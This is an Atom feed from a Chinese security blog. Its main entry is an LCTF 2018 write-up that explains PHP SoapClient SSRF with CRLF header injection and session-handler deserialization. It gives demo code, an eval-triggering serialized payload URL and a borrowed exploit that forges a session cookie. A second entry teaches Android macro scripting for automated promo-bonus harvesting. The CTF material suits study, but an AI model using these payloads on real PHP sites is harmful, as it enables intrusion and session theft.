<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Passerby&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://passer6y.fun/"/>
  <updated>2019-02-09T16:12:26.461Z</updated>
  <id>http://passer6y.fun/</id>
  
  <author>
    <name>Passer6y</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>LCTF 2018 Babyphp&#39;s revenge</title>
    <link href="http://passer6y.fun/2019/02/10/LCTF%202018%20Babyphp&#39;s%20revenge/"/>
    <id>http://passer6y.fun/2019/02/10/LCTF 2018 Babyphp&#39;s revenge/</id>
    <published>2019-02-09T16:10:00.000Z</published>
    <updated>2019-02-09T16:12:26.461Z</updated>
    
    <content type="html"><![CDATA[<p>继续填坑..<br><a id="more"></a></p><h2 id="Babyphp’s-revenge"><a href="#Babyphp’s-revenge" class="headerlink" title="Babyphp’s revenge"></a>Babyphp’s revenge</h2><p>考点：session反序列化+soap+ssrf</p><h3 id="一：-soap-ssrf"><a href="#一：-soap-ssrf" class="headerlink" title="一： soap ssrf"></a>一： soap ssrf</h3><ol><li><p>soap服务是什么？<br><img src="http://static.zybuluo.com/Passer6y/bfu9tthia4k90bvlfyakpwoa/image_1d368hpc812j6vgt12nnomj15ai9.png" alt="image_1d368hpc812j6vgt12nnomj15ai9.png-18.2kB"><br>简单而言即一种通信方式</p></li><li><p>特征<br>在phpinfo中可以看到<br><img src="http://static.zybuluo.com/Passer6y/jbrdrf23eic87pmw0eku7qqx/image_1d368p2le1ftg1u711senfq88rp16.png" alt="image_1d368p2le1ftg1u711senfq88rp16.png-74.5kB"></p></li><li><p>利用条件<br>有可控的点去反序列化调用soapclient类进行SSRF</p></li></ol><p>那么为什么要选择使用soapclient这个类呢？</p><ul><li>如果开启了soap服务，soapclient类就是php的内置类</li><li>从php文档中可以看到，其第一个参数为$Url，这就为之后的ssrf作为铺垫<br><img src="http://static.zybuluo.com/Passer6y/v2m6b0hriotdazaput1p459y/image_1d36apbldfe5t6k10k3j6skjg1j.png" alt="image_1d36apbldfe5t6k10k3j6skjg1j.png-12kB"></li><li>其次当数据被反序列化后，其对象还要调用一个不存在的类，以调用soapclient的__call方法</li></ul><blockquote><p>同时该类__call方法还有crlf注入漏洞，具体分析见：<a href="https://xz.aliyun.com/t/2148" target="_blank" rel="noopener">https://xz.aliyun.com/t/2148</a></p></blockquote><p>如何触发ssrf呢？<br>参考： </p><ul><li><a href="https://xz.aliyun.com/t/2148#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/2148#toc-0</a></li><li><a href="http://php.net/manual/zh/soapclient.soapclient.php" target="_blank" rel="noopener">http://php.net/manual/zh/soapclient.soapclient.php</a></li></ul><p>该类实例化的时候有两个参数：<br><img src="http://static.zybuluo.com/Passer6y/xuxs1zvq8enjdrecy8yu8iip/image_1d36c2pvtjn21por2trqvf1ffb20.png" alt="image_1d36c2pvtjn21por2trqvf1ffb20.png-35.3kB"><br>第一个参数控制是否为WSDL模式。如果为NULL，就是non-WSDL模式。<br>如果是非wsdl模式，反序列化的时候就会对options中的url进行远程soap请求。<br><img src="http://static.zybuluo.com/Passer6y/1ha4j8ki4elb8kqtn1ogn6g2/image_1d36c8d6mg6tsiq1k431k1d1uli2d.png" alt="image_1d36c8d6mg6tsiq1k431k1d1uli2d.png-106.3kB"><br>如果是wsdl模式，在序列化之前就会对$url参数进行请求，从而无法可控序列化数据。</p><p>本地复现：<br><img src="http://static.zybuluo.com/Passer6y/akjnfrhidbltnedbt1uh8yr5/image_1d36m8qmuoi6pft6tvgh1tug9.png" alt="image_1d36m8qmuoi6pft6tvgh1tug9.png-62.9kB"><br>代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$location = &apos;http://155.94.177.154:6666/&apos;;</span><br><span class="line">$a = new SoapClient(null, array(&apos;location&apos; =&gt; $location ,&apos;uri&apos;  =&gt; &apos;123&apos;));</span><br><span class="line">$auth=  unserialize(serialize($a));</span><br><span class="line">$auth-&gt;aa();</span><br><span class="line">echo &quot;1&quot;;</span><br></pre></td></tr></table></figure></p><p>另一台vps上开启监听：<br><img src="http://static.zybuluo.com/Passer6y/j0ultsskxqj45scoto9i9fr8/image_1d36mb5vv9t5ctchmgmsn1e2tm.png" alt="image_1d36mb5vv9t5ctchmgmsn1e2tm.png-11.2kB"></p><p>执行：<br><img src="http://static.zybuluo.com/Passer6y/d535hyg4qv14nchcydmlyo4h/image_1d36md4p9npvjcs6psc92s0q1j.png" alt="image_1d36md4p9npvjcs6psc92s0q1j.png-13.2kB"></p><p>vps监听到：<br><img src="http://static.zybuluo.com/Passer6y/q8a8klv10qiu0zstoqowi9yf/image_1d36mdtlq1d2t9bgbhdbt25lu20.png" alt="image_1d36mdtlq1d2t9bgbhdbt25lu20.png-140.9kB"></p><p>可以看到在soap库发送的xml数据在数据包的post处，所以这个的局限在于一般只能打get形的ssrf。</p><h3 id="二：php-session反序列化"><a href="#二：php-session反序列化" class="headerlink" title="二：php session反序列化"></a>二：php session反序列化</h3><p>其核心原理在于php在存储序列化$_SESSION数据引擎和反序列化该数据的引擎不一样导致。</p><p>利用条件：</p><ul><li><p>在同一网站能同时出现两种不同的session配置方式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.serialize_handler=php_serialize|php</span><br></pre></td></tr></table></figure></li><li><p>$_SESSION值可控</p></li></ul><p>满足以上几点即等价于我们对unserialize()的参数可控。</p><p>php.ini中的配置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">session.save_path=&quot;D:\xampp\tmp&quot;表明所有的session文件都是存储在xampp/tmp下</span><br><span class="line">session.save_handler=files  表明session是以文件的方式来进行存储的</span><br><span class="line">session.auto_start=0表明默认不启动session</span><br><span class="line">session.serialize_handler=php --定义用来序列化/反序列化的处理器名字。默认使用php</span><br></pre></td></tr></table></figure></p><p>session.serialize_handler的其他几种配置项：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</span><br><span class="line">php:存储方式是，键名+竖线+经过serialize()函数序列处理的值</span><br><span class="line">php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值</span><br></pre></td></tr></table></figure></p><p>使用<code>session.serialize_handler=php_serialize</code>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&apos;session.serialize_handler&apos;, &apos;php_serialize&apos;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&quot;name&quot;] = &quot;PASSER6Y&quot;;</span><br></pre></td></tr></table></figure></p><p><img src="http://static.zybuluo.com/Passer6y/e7iqr1clgbmg82kqc7u8ryks/image_1d36r14f3m311ha2b8p1crh37m2d.png" alt="image_1d36r14f3m311ha2b8p1crh37m2d.png-83.1kB"><br>该方式在序列化数据前加了a:1:</p><p>而使用默认配置时(<code>session.serialize_handler=php</code>)：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//ini_set(&apos;session.serialize_handler&apos;, &apos;php_serialize&apos;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&quot;name&quot;] = &quot;PASSER6Y&quot;;</span><br></pre></td></tr></table></figure></p><p><img src="http://static.zybuluo.com/Passer6y/gjwxa7owf1zl1cku68yjc94v/image_1d36r4uf8c0718nj1igd1kmn1o352q.png" alt="image_1d36r4uf8c0718nj1igd1kmn1o352q.png-155.7kB"><br>php引擎将竖线(|)将其分割成两部分，前面为键名，后面为序列化数据</p><p>两者的差异在于用php方式时以<code>|</code>分割，如果我们在<code>php_serialize</code>存入的数据带有<code>|</code>，而取出数据时使用php引擎，则会导致序列化数据在经过php引擎时被反序列化引发安全问题。</p><p>漏洞复现demo：<br>1.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&apos;session.serialize_handler&apos;, &apos;php_serialize&apos;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&quot;passer6y&quot;]=$_GET[&quot;a&quot;];</span><br></pre></td></tr></table></figure></p><p>2.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);</span><br><span class="line">session_start();</span><br><span class="line">class aa &#123;</span><br><span class="line">    var $hi;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;hi = &apos;phpinfo();&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">         eval($this-&gt;hi);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>构造payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);</span><br><span class="line">session_start();</span><br><span class="line">class aa &#123;</span><br><span class="line">    var $hi;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;hi = &apos;phpinfo();&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">         eval($this-&gt;hi);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new aa();</span><br><span class="line"></span><br><span class="line">echo serialize($a);     //O:2:&quot;aa&quot;:1:&#123;s:2:&quot;hi&quot;;s:10:&quot;phpinfo();&quot;;&#125;</span><br><span class="line">echo &quot;\n\n&quot;;</span><br><span class="line">echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure></p><p>payload: <code>http://ip/?a=|O:2:%22aa%22:1:{s:2:%22hi%22;s:10:%22phpinfo();%22;}</code></p><p>然后访问：2.php<br><img src="http://static.zybuluo.com/Passer6y/tmhm44j9p6xrzqwe5pjn9trz/image_1d36sp0n7ktotav1hi8pqtbo3k.png" alt="image_1d36sp0n7ktotav1hi8pqtbo3k.png-52.2kB"></p><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>回到题目来看，分析一下题目逻辑；<br>index.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$b = &apos;implode&apos;;</span><br><span class="line">call_user_func($_GET[&apos;f&apos;],$_POST);</span><br><span class="line">session_start();</span><br><span class="line">if(isset($_GET[&apos;name&apos;]))&#123;</span><br><span class="line">    $_SESSION[&apos;name&apos;] = $_GET[&apos;name&apos;];</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = array(reset($_SESSION),&apos;welcome_to_the_lctf2018&apos;);</span><br><span class="line">call_user_func($b,$a);</span><br></pre></td></tr></table></figure></p><p>flag.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">echo &apos;only localhost can get flag!&apos;;</span><br><span class="line">$flag = &apos;LCTF&#123;******************&#125;&apos;;</span><br><span class="line">if($_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;)&#123;</span><br><span class="line">$_SESSION[&apos;flag&apos;] = $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>第一个<code>call_user_func()</code>函数可以帮助我们将php的session处理方式设置为<code>php_serialize</code>，这里可以使用<code>session_start()</code>来开启，他支持一个数组参数：<br><img src="http://static.zybuluo.com/Passer6y/tv8xayjymacm395sjeurapjz/image_1d391q74slqa1gbp15jecnc14ma9.png" alt="image_1d391q74slqa1gbp15jecnc14ma9.png-13.4kB"></p><p>所以这一步我们将<code>$_GET[&#39;f&#39;]=session_start</code>,然后post数据：<code>serialize_handler=php_serialize</code></p><p>再往下<code>$_GET[&#39;name&#39;]</code>，这使得我们可以控制session，所以这一步传入我们的soup的ssrf反序列化数据。</p><p>从flag.php中可知，flag是存储在我们的session中的(成功触发后，<code>var_dump($_SESSION);</code>会显示出我们的flag)，所以我们ssrf的时候要带上session，这里会用到soup ssrf的crlf漏洞。</p><p>当然在这里，soup ssrf 还需要一步，就是调用其类中的<code>__call</code>方法，这里参考文档：<br><img src="http://static.zybuluo.com/Passer6y/7dr647kzvcpu6lq8ed84dce3/image_1d3928hpt1uav102t87v2n31i4tm.png" alt="image_1d3928hpt1uav102t87v2n31i4tm.png-15.1kB"></p><p>所以我们将精心构造的session数据存入后，第二次访问，利用变量覆盖将<code>$b</code>变成<code>call_user_func</code>，然后就能调用一个不存在的方法(<code>welcome_to_the_lctf2018</code>),从而触发<code>__call</code>方法，形成ssrf。</p><p>不知道环境问题还是啥调了很久，在第一步修改session_handle的类型时修改失败了，导致后面无法触发ssrf。复现的时候没有官方docker，调了很久还是不是很明白…</p><p><img src="http://static.zybuluo.com/Passer6y/hgggcquf896j63z2byrijoc7/image_1d39g8666dtm1sgh1voe1t89j3n1t.png" alt="image_1d39g8666dtm1sgh1voe1t89j3n1t.png-95.3kB"></p><p>嫖的exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$target=&apos;http://127.0.0.1/flag.php&apos;;</span><br><span class="line">$b = new SoapClient(null,array(&apos;location&apos; =&gt; $target,</span><br><span class="line">                               &apos;user_agent&apos; =&gt; &quot;AAA:BBB\r\n&quot; .</span><br><span class="line">                                             &quot;Cookie:PHPSESSID=dde63k4h9t7c9dfl79np27e912&quot;,</span><br><span class="line">                               &apos;uri&apos; =&gt; &quot;http://127.0.0.1/&quot;));</span><br><span class="line"></span><br><span class="line">$se = serialize($b); </span><br><span class="line">echo urlencode($se);</span><br></pre></td></tr></table></figure></p><p>第二步：<br><img src="http://static.zybuluo.com/Passer6y/v3t4jjyvhwwh6eidi5ozw683/image_1d39g291h1i0s3jb1ao71cb614qe1g.png" alt="image_1d39g291h1i0s3jb1ao71cb614qe1g.png-44.1kB"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;继续填坑..&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://passer6y.fun/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://passer6y.fun/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>按键精灵学习记录</title>
    <link href="http://passer6y.fun/2019/02/09/%E6%8C%89%E9%94%AE%E7%B2%BE%E7%81%B5%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <id>http://passer6y.fun/2019/02/09/按键精灵学习记录/</id>
    <published>2019-02-09T11:00:00.000Z</published>
    <updated>2019-02-09T11:16:06.519Z</updated>
    
    <content type="html"><![CDATA[<p>最新不知道抽了什么风，又开始搞起了薅羊毛，还想着能多偷点懒，这两天学了会按键精灵脚本，写了初步能自动化薅羊毛的工具：<a href="https://github.com/Passer6y/quickMacro" target="_blank" rel="noopener">https://github.com/Passer6y/quickMacro</a></p><a id="more"></a><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><ol><li>声明变量:Dim<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Dim screenX</span><br><span class="line">screenX = GetScreenX（）</span><br></pre></td></tr></table></figure></li></ol><p>2.延时:Delay<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Delay 1000 //延时1000毫秒，也就是1秒再往下执行</span><br></pre></td></tr></table></figure></p><ol start="3"><li>点击<br>触摸屏幕中的一个位置-&gt;经过一小段时间延时-&gt;放手<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TouchDown  x,y,1       //x,y为坐标，也就是点击屏幕的位置</span><br><span class="line">Delay 50</span><br><span class="line">TouchUp 1</span><br></pre></td></tr></table></figure></li></ol><p>tap封装了以上的几个操作步骤：<br><code>Tap x,y</code></p><p><img src="http://static.zybuluo.com/Passer6y/n27ij4qkrkf2xmwyedam4fzv/image_1d31gnp159n0u0u8g41lm31qcjm.png" alt="image_1d31gnp159n0u0u8g41lm31qcjm.png-74.7kB"></p><ol start="4"><li><p>安卓三键：主菜单、主页、返回</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">KeyPress &quot;Menu&quot;</span><br><span class="line">KeyPress &quot;Home&quot;</span><br><span class="line">KeyPress &quot;Back&quot;</span><br></pre></td></tr></table></figure></li><li><p>调试：ShowMessage和TracePrint<br>ShowMessage:显示提示，两条消息之间建议1秒以上间隔。<br>TracePrint：在调试页显示信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Dim 循环次数 = 0</span><br><span class="line">Do</span><br><span class="line">    Delay 1000</span><br><span class="line">    循环次数 = 循环次数+1</span><br><span class="line">    TracePrint “循环次数：”&amp;循环次数&amp;“次”</span><br><span class="line">    ShowMessage “循环次数：”&amp;循环次数&amp;“次”</span><br><span class="line">Loop</span><br></pre></td></tr></table></figure></li><li><p>滑屏幕：swipe</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Swipe 10,10,100,100,300               //从坐标10,10划动到坐标100,100，历时300毫秒</span><br></pre></td></tr></table></figure></li></ol><p>滑动 停顿 再松<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TouchDown 10, 10, 1</span><br><span class="line">Delay 1000</span><br><span class="line">TouchMove 100, 100, 1, 300</span><br><span class="line">Delay 1000</span><br><span class="line">TouchUp 1</span><br></pre></td></tr></table></figure></p><ol start="7"><li>循环<br>demo1:循环点击 (10,10) 一千次<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">For 1000</span><br><span class="line">    Tap 10,10</span><br><span class="line">    // 退出 Exit For</span><br><span class="line">Next</span><br></pre></td></tr></table></figure></li></ol><p>demo2: 一直点击<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Do</span><br><span class="line">Tap 10,10</span><br><span class="line">//退出 Exit Do</span><br><span class="line">Loop</span><br></pre></td></tr></table></figure></p><h2 id="图色操作"><a href="#图色操作" class="headerlink" title="图色操作"></a>图色操作</h2><ol><li><p>获取屏幕上某点颜色：GetPixelColor()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Dim rColor</span><br><span class="line">rColor = GetPixelColor(300, 300)</span><br><span class="line">If rColor = &quot;FFFFFF&quot; Then </span><br><span class="line">    TracePrint &quot;坐标（300,300）的像素点颜色是FFFFFF，说明当前处于XX界面下&quot;</span><br><span class="line">Else </span><br><span class="line">    TracePrint &quot;坐标（300,300）的像素点颜色不是FFFFFF，说明还没到XX界面&quot;</span><br><span class="line">End If</span><br></pre></td></tr></table></figure></li><li><p>多点比色:<code>CmpColorEx(mul_color,sim)</code><br>即判断当前场景<br>取点(2,2)和点(4,3)以000000-202020的偏色范围(前后各10),相似度0.9的容错判断是否为同一个图，可以用抓抓快捷生成参数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">If CmpColorEx(&quot;2|2|000000-202020,4|3|000000-202020&quot;, 0.9) = 1 Then </span><br><span class="line">    TracePrint &quot;这是第二个图&quot;</span><br><span class="line">Else </span><br><span class="line">    TracePrint &quot;这不是第二个图&quot;</span><br><span class="line">End If</span><br></pre></td></tr></table></figure></li></ol><blockquote><p>抓抓快捷生成参数： 取两点-&gt;点开’颜色’-&gt;在’颜色记录汇总’选中我们采的两点-&gt;进入‘多点比色’模式-&gt;复制’颜色描述’即可</p></blockquote><ol start="3"><li>多点找色：<code>FindMultiColor</code><br>即找到唯一的图标的作用<br>0,0,0,0表示全屏查找，10,20,30,40表示从坐标(10,20)和(30,40)组成的矩形范围。000000初始点的颜色值?，000000-202020(202020依旧是偏色)0|1是相对坐标(往右0，往下1)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Dim IntX,IntY</span><br><span class="line">FindMultiColor 0,0,0,0,&quot;000000&quot;,&quot;0|1|000000-202020&quot;,0,0.9,intX,intY</span><br><span class="line">If intX &gt; -1 Then</span><br><span class="line">    TracePrint &quot;找到啦，坐标在&quot;&amp;intX&amp;&quot;,&quot;&amp;intY</span><br><span class="line">Else</span><br><span class="line">    TracePrint &quot;没找到&quot;</span><br><span class="line">End If</span><br></pre></td></tr></table></figure></li></ol><blockquote><p>抓抓多点找色：和上面一样的方法</p></blockquote><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><ol><li>定义/调用函数<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Function 自定义函数()</span><br><span class="line">        TracePrint “我是自定义函数，被你调用了”</span><br><span class="line">End Function</span><br></pre></td></tr></table></figure></li></ol><p>调用函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">自定义函数</span><br><span class="line">自定义函数()        // 推荐</span><br><span class="line">Call 自定义函数()</span><br></pre></td></tr></table></figure></p><p>demo:比大小<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Function 比大小(参数1, 参数2)</span><br><span class="line">        If 参数1 &gt; 参数2 Then </span><br><span class="line">                比大小 = 参数1          // 函数返回值</span><br><span class="line">        ElseIf 参数1 &lt; 参数2 Then</span><br><span class="line">                比大小 = 参数2</span><br><span class="line">        Else </span><br><span class="line">                TracePrint &quot;两个数一样大&quot;</span><br><span class="line">        End If</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">Dim numA,numB</span><br><span class="line">numA = 3</span><br><span class="line">numB = 3</span><br><span class="line">If 比大小(numA, numB) &lt;&gt; null Then </span><br><span class="line">        TracePrint &quot;较大的值是：&quot;&amp;比大小(numA,numB)</span><br><span class="line">End If</span><br></pre></td></tr></table></figure></p><h2 id="数据类型转换"><a href="#数据类型转换" class="headerlink" title="数据类型转换"></a>数据类型转换</h2><p>我们从用户输入中读取的数据往往需要做类型转换。<br>demo: 将输入框的数据从字符串型变成整型<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Dim 用户输入 = ReadUIConfig(&quot;输入框1&quot;)</span><br><span class="line">If CInt(用户输入) = 1 Then </span><br><span class="line">        TracePrint 用户输入</span><br><span class="line">End If</span><br></pre></td></tr></table></figure></p><h2 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h2><p>开启log记录后，会将所有的tranceprint都输出到log文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Log.Open </span><br><span class="line">**************</span><br><span class="line">TracePrint &quot;test&quot;</span><br><span class="line">TracePrint GetTempDir()</span><br><span class="line">**************</span><br><span class="line">Log.Close</span><br></pre></td></tr></table></figure></p><h2 id="分辨率"><a href="#分辨率" class="headerlink" title="分辨率"></a>分辨率</h2><p>使用的720x1280的设备开发的程序则注明如下代码，以便程序自适应其他设备(多点比色，找色这些功能才有用)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetScreenScale 720,1280</span><br></pre></td></tr></table></figure></p><h2 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h2><p>一般用于一个线程运行脚本，另一个线程干其他的(检测是否卡主等等)<br><img src="http://static.zybuluo.com/Passer6y/k13f95xfntaa0sucrqmipnae/image_1d33b7oli42eu2k1c4ku5i1e8fm.png" alt="image_1d33b7oli42eu2k1c4ku5i1e8fm.png-77.2kB"><br><img src="http://static.zybuluo.com/Passer6y/majk7t188ih2ooww2ngg7zds/image_1d33b74ub1a7tesf9iug67igg9.png" alt="image_1d33b74ub1a7tesf9iug67igg9.png-242.6kB"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最新不知道抽了什么风，又开始搞起了薅羊毛，还想着能多偷点懒，这两天学了会按键精灵脚本，写了初步能自动化薅羊毛的工具：&lt;a href=&quot;https://github.com/Passer6y/quickMacro&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/Passer6y/quickMacro&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Code" scheme="http://passer6y.fun/categories/Code/"/>
    
    
      <category term="Code" scheme="http://passer6y.fun/tags/Code/"/>
    
  </entry>
  
  <entry>
    <title>HCTF 2018 Web Writeup</title>
    <link href="http://passer6y.fun/2019/02/05/HCTF%202018%20Web%20WriteUp/"/>
    <id>http://passer6y.fun/2019/02/05/HCTF 2018 Web WriteUp/</id>
    <published>2019-02-05T07:51:00.000Z</published>
    <updated>2019-02-05T07:41:34.711Z</updated>
    
